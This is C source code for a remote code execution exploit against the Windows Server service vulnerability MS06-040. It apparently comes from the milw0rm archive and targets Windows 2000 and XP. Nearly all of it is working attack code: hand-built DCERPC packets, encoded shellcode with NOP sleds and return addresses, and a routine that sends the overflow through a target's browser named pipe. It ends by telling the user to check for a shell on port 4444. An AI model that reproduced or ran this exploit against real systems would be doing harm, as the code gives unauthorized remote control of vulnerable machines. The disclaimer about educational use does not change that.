/*
 * MS06-040 Remote Code Execution Proof of Concept
 *
 * Ported by ub3r st4r aka iRP
 * ---------------------------------------------------------------------
 * Tested Against:
 *  Windows XP SP1
 *  Windows 2000 SP4
 *
 * Systems Affected:
 *  Microsoft Windows 2000 SP0-SP4
 *  Microsoft Windows XP SP0-SP1
 *  Microsoft Windows NT 4.0
 * ---------------------------------------------------------------------
 * This is provided as proof-of-concept code only for educational
 * purposes and testing by authorized individuals with permission
 * to do so.
 *
 * PRIVATE v.0.2 (08-27-06)
 */

#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "mpr")
#pragma comment(lib, "Rpcrt4")

// bind uuid interface: 4b324fc8-1670-01d3-1278-5a47bf6ee188 v3.0
unsigned char DCERPC_Bind_RPC_Service[] =
       "\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x00\x00\x00\x00"
       "\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
       "\xC8\x4F\x32\x4B\x70\x16\xD3\x01\x12\x78\x5A\x47\xBF\x6E\xE1\x88"
       "\x03\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00"
       "\x2B\x10\x48\x60\x02\x00\x00\x00";

// request windows api: NetprPathCanonicalize (0x1f)
unsigned char DCERPC_Request_RPC_Service[] =
       "\x05\x00\x00\x03\x10\x00\x00\x00\x30\x08\x00\x00\x00\x00\x00\x00"
       "\x18\x08\x00\x00\x00\x00\x1f\x00\xff\xff\xff\xff\x01\x00\x00\x00"
       "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00";

       // path ...

unsigned char DCERPC_Request_RPC_Service_[] =
       "\xfa\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
       "\x00\x00\x00\x00\xfa\x00\x00\x00\x00\x00\x00\x00";

unsigned char sc[] =
       "\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa8\x97\x90"
       "\x88\x83\xeb\xfc\xe2\xf4\x29\x53\x6f\x67\x57\x68\xd4\x74\xc2\x7c"
       "\xdd\x60\x51\x68\x6f\x77\xc8\x1c\xfc\xac\x8c\x1c\xd5\xb4\x23\xeb"
       "\x95\xf0\xa9\x78\x1b\xc7\xb0\x1c\xcf\xa8\xa9\x7c\xd9\x03\x9c\x1c"
       "\x91\x66\x99\x57\x09\x24\x2c\x57\xe4\x8f\x69\x5d\x9d\x89\x6a\x7c"
       "\x64\xb3\xfc\xb3\xb8\xfd\x4d\x1c\xcf\xac\xa9\x7c\xf6\x03\xa4\xdc"
       "\x1b\xd7\xb4\x96\x7b\x8b\x84\x1c\x19\xe4\x8c\x8b\xf1\x4b\x99\x4c"
       "\xf4\x03\xeb\xa7\x1b\xc8\xa4\x1c\xe0\x94\x05\x1c\xd0\x80\xf6\xff"
       "\x1e\xc6\xa6\x7b\xc0\x77\x7e\xf1\xc3\xee\xc0\xa4\xa2\xe0\xdf\xe4"
       "\xa2\xd7\xfc\x68\x40\xe0\x63\x7a\x6c\xb3\xf8\x68\x46\xd7\x21\x72"
       "\xf6\x09\x45\x9f\x92\xdd\xc2\x95\x6f\x58\xc0\x4e\x99\x7d\x05\xc0"
       "\x6f\x5e\xfb\xc4\xc3\xdb\xfb\xd4\xc3\xcb\xfb\x68\x40\xee\xc0\x86"
       "\xcc\xee\xfb\x1e\x71\x1d\xc0\x33\x8a\xf8\x6f\xc0\x6f\x5e\xc2\x87"
       "\xc1\xdd\x57\x47\xf8\x2c\x05\xb9\x79\xdf\x57\x41\xc3\xdd\x57\x47"
       "\xf8\x6d\xe1\x11\xd9\xdf\x57\x41\xc0\xdc\xfc\xc2\x6f\x58\x3b\xff"
       "\x77\xf1\x6e\xee\xc7\x77\x7e\xc2\x6f\x58\xce\xfd\xf4\xee\xc0\xf4"
       "\xfd\x01\x4d\xfd\xc0\xd1\x81\x5b\x19\x6f\xc2\xd3\x19\x6a\x99\x57"
       "\x63\x22\x56\xd5\xbd\x76\xea\xbb\x03\x05\xd2\xaf\x3b\x23\x03\xff"
       "\xe2\x76\x1b\x81\x6f\xfd\xec\x68\x46\xd3\xff\xc5\xc1\xd9\xf9\xfd"
       "\x91\xd9\xf9\xc2\xc1\x77\x78\xff\x3d\x51\xad\x59\xc3\x77\x7e\xfd"
       "\x6f\x77\x9f\x68\x40\x03\xff\x6b\x13\x4c\xcc\x68\x46\xda\x57\x47"
       "\xf8\x67\x66\x77\xf0\xdb\x57\x41\x6f\x58";

int main(int argc, char* argv[])
{
       HANDLE hFile;
       NETRESOURCE nr;

       char szRemoteName[MAX_PATH], szPipePath[MAX_PATH];

       unsigned int i;

       unsigned char szInBuf[4096];
       unsigned long dwRead, nWritten;

       unsigned char szReqBuf[2096];

       if (argc < 3){
               printf("[-] Usage: ms06040poc <host> [target]\n");
               printf("\t1 - Windows 2000 SP0-SP4\n");
               printf("\t2 - Windows XP SP0-SP1\n");
               return -1;
       }

       memset(szReqBuf, 0, sizeof(szReqBuf));

       if (atoi(argv[2]) == 1) {
               unsigned char szBuff[1064];

               // build payload buffer
               memset(szBuff, '\x90', 1000);
               memcpy(szBuff+630, sc, sizeof(sc));

               for(i=1000; i<1064; i+=4) {
                       memcpy(szBuff+i, "\x04\x08\x02\x00", 4);
               }

               // build request buffer
               memcpy(szReqBuf, DCERPC_Request_RPC_Service, sizeof(DCERPC_Request_RPC_Service)-1);
               memcpy(szReqBuf+44, "\x15\x02\x00\x00", 4); /* max count */
               memcpy(szReqBuf+48, "\x00\x00\x00\x00", 4); /* offset */
               memcpy(szReqBuf+52, "\x15\x02\x00\x00", 4); /* actual count */
               memcpy(szReqBuf+56, szBuff, sizeof(szBuff));
               memcpy(szReqBuf+1120, "\x00\x00\x00\x00", 4); /* align string */
               memcpy(szReqBuf+1124, DCERPC_Request_RPC_Service_, sizeof(DCERPC_Request_RPC_Service_)-1);
               memcpy(szReqBuf+1140 , "\xeb\x02", 2);
       }
       if (atoi(argv[2]) == 2) {
               unsigned char szBuff[708];

               memset(szBuff, '\x90', 612); /* size of shellcode */
               memcpy(szBuff, sc, sizeof(sc));

               memcpy(szBuff+612, "\x0a\x08\x02\x00", 4);
               memset(szBuff+616, 'A', 8); // 8 bytes padding
               memcpy(szBuff+624, "\x04\x08\x02\x00", 4);
               memset(szBuff+628, '\x90', 32);
               memcpy(szBuff+660, "\x04\x08\x02\x00", 4);
               memset(szBuff+664, 'B', 8); // 8 bytes padding
               memcpy(szBuff+672, "\x04\x08\x02\x00", 4);
               memset(szBuff+676, '\x90', 32);

               // build request buffer
               memcpy(szReqBuf, DCERPC_Request_RPC_Service, sizeof(DCERPC_Request_RPC_Service)-1);
               memcpy(szReqBuf+44, "\x63\x01\x00\x00", 4); /* max count */
               memcpy(szReqBuf+48, "\x00\x00\x00\x00", 4); /* offset */
               memcpy(szReqBuf+52, "\x63\x01\x00\x00", 4); /* actual count */
               memcpy(szReqBuf+56, szBuff, sizeof(szBuff));
               memcpy(szReqBuf+764, "\x00\x00\x00\x00", 4); /* align string */
               memcpy(szReqBuf+768, DCERPC_Request_RPC_Service_, sizeof(DCERPC_Request_RPC_Service_)-1);
       }

       printf("[+] Connecting to %s ... \n", argv[1]);

       _snprintf(szRemoteName, sizeof(szRemoteName), "\\\\%s\\ipc$", argv[1]);
       nr.dwType = RESOURCETYPE_ANY;
       nr.lpLocalName = NULL;
       nr.lpProvider = NULL;
       nr.lpRemoteName = szRemoteName;
       if (WNetAddConnection2(&nr, "", "", 0) != NO_ERROR) {
               printf("[-] Failed to connect to host !\n");
               return -1;
       }

       _snprintf(szPipePath, sizeof(szPipePath), "\\\\%s\\pipe\\browser", argv[1]);
       hFile = CreateFile(szPipePath, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

       if (hFile == INVALID_HANDLE_VALUE) {
               printf("[-] Failed to open named pipe !\n");
               return -1;
       }

       printf("[+] Binding to RPC interface ... \n");
       if (TransactNamedPipe(hFile, DCERPC_Bind_RPC_Service, sizeof(DCERPC_Bind_RPC_Service), szInBuf, sizeof(szInBuf), &dwRead, NULL) == 0) {
               printf("[-] Failed to bind to interface !\n");
               CloseHandle(hFile);
               return -1;
       }

       printf("[+] Sending RPC request ... \n");
       if (!WriteFile(hFile, szReqBuf, sizeof(szReqBuf), &nWritten, 0)) {
               printf("[-] Unable to transmit RPC request !\n");
               CloseHandle(hFile);
               return -1;
       }

       printf("[+] Now check for shell on %s:4444 !\n", argv[1]);

       return 0;
}

// milw0rm.com [2006-08-28]
